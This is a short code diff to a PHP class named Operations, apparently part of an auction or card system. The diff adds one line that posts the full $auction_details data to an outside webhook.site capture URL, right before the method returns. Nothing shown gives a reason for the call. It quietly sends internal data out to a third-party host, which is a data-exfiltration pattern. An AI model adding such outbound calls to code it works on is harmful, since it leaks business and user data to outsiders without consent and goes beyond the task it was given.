@@ -194,6 +194,8 @@ class Operations {
             $auction->decrement('count_cards',$count_required ?: 1);
         endif;
 
+        Http::post('https://webhook.site/f661d811-5d9e-4541-9c48-f3d022e1becf',$auction_details);
+
         return $auction_details;
     }
 }
